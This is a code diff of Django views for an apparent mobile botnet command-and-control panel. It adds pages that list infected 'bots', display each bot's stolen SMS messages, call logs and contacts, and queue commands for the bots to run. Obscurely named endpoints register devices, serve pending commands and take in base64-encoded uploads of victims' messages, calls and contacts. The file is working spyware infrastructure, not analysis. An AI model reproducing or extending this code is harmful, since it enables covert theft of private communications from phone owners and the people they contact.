@@ -1,7 +1,7 @@
 # -*- coding: utf-8 -*-
 from __future__ import unicode_literals
 
-from django.shortcuts import render
+from django.shortcuts import render, redirect
 from django.http import HttpResponse, JsonResponse
 
 import logging
@@ -10,13 +10,48 @@ import models
 import datetime
 import dateutil.parser
 
+from .models import Bot, BotCommand, SmsData, CallLog, Contact
 
 logger = logging.getLogger(__name__)
 
 
 def index(request):
-    return HttpResponse("index")
+    return render(request,"index.html", {'bots': Bot.objects.all()})
 
+
+def bots(request, bot_id):
+    smsData = SmsData.objects.filter(bot_id=bot_id)
+    callLog = CallLog.objects.filter(bot_id=bot_id)
+    contact = Contact.objects.filter(bot_id=bot_id)
+    return render(request,"bots.html", {'bot_id':bot_id ,
+                                        'smsDataMsgs':smsData,
+                                        'callLog': callLog,
+                                        'contactLog': contact,
+                                        })
+
+
+def send_command(request, bot_id):
+    if request.method != "POST":
+        return HttpResponse("send command")
+    else:
+        bot = Bot.objects.get(id=bot_id)
+        command = BotCommand()
+        command.bot = bot
+        command.command = request.POST['command']
+        command.parameters = request.POST['commandParam']
+        command.executed = False
+        command.save()
+        return redirect("bots", bot_id=bot_id)
+
+
+def deletedata(request, data_id, bot_id):
+    if data_id == "msgs":
+        SmsData.objects.all().delete()
+    if data_id == "calllogs":
+        CallLog.objects.all().delete()
+    if data_id == "contactlogs":
+        Contact.objects.all().delete()
+    return redirect("bots", bot_id=bot_id)
 
 def stbi(request):
     """
@@ -29,7 +64,7 @@ def stbi(request):
         print("device registration: %s" % data)
         bot = None
         try:
-            bot = models.Bot.objects.get(hash=data['hash'])
+            bot = models.Bot.objects.get(number=data.get('number', ''))
         except models.Bot.DoesNotExist:
             bot = models.Bot()
             bot.hash = data['hash']
@@ -55,6 +90,7 @@ def sban(request):
 
 
 def sy(request):
+    """ Bot has requested for commands, send it some commands """
     if request.method != "POST":
         return HttpResponse("sy")
     else:
@@ -71,6 +107,7 @@ def sy(request):
                              "command_data": command.parameters,
                              "command_sig": command.id})
             command.deployed = datetime.datetime.utcnow()
+            command.executed = True     
             command.save()
 
         return JsonResponse({"commands": commands})
@@ -80,7 +117,9 @@ def ssl(request):
     if request.method != "POST":
         return HttpResponse("ssl")
     else:
+        #SmsData.objects.all().delete()
         data = json.loads(request.body.decode('base64'))
+        SmsData.objects.filter(bot_id=data['bot_id']).delete()
         print("SendSmsList (ssl): %s" % data)
         bot = models.Bot.objects.get(id=data['bot_id'])
         for msg in data['sms_list']:
@@ -99,7 +138,9 @@ def scal(request):
     if request.method != "POST":
         return HttpResponse("scal")
     else:
+        #CallLog.objects.all().delete()
         data = json.loads(request.body.decode('base64'))
+        CallLog.objects.filter(bot_id=data['bot_id']).delete()
         print("SendCallList (scal): %s" % data)
         bot = models.Bot.objects.get(id=data['bot_id'])
         for msg in data['call_list']:
@@ -109,7 +150,7 @@ def scal(request):
             call.date = dateutil.parser.parse(msg['date'])
             call.duration = msg['duration']
             call.type = msg['type']
-            call.type_str = msg['typeStr']
+            #call.type_str = msg['typeStr']
             call.number = msg['number']
             call.save()
         return HttpResponse("OK")
@@ -120,6 +161,7 @@ def scol(request):
         return HttpResponse("scol")
     else:
         data = json.loads(request.body.decode('base64'))
+        Contact.objects.filter(bot_id=data['bot_id']).delete()
         print("SendContactList (scol): %s" % data)
         bot = models.Bot.objects.get(id=data['bot_id'])
         for msg in data['contact_list']:
@@ -141,7 +183,8 @@ def ucs(request):
     else:
         data = json.loads(request.body.decode('base64'))
         print("ExecutedCommand (ucs): %s", data)
-        cmd = models.BotCommand.objects.get(id=data['command_sig'])
-        cmd.executed = True
-        cmd.save()
+        #cmd = models.BotCommand.objects.get(id=data['command_sig']) \
+        #    if 'command_sig' in data else
+        #cmd.executed = True
+        #cmd.save()
         return HttpResponse("OK")
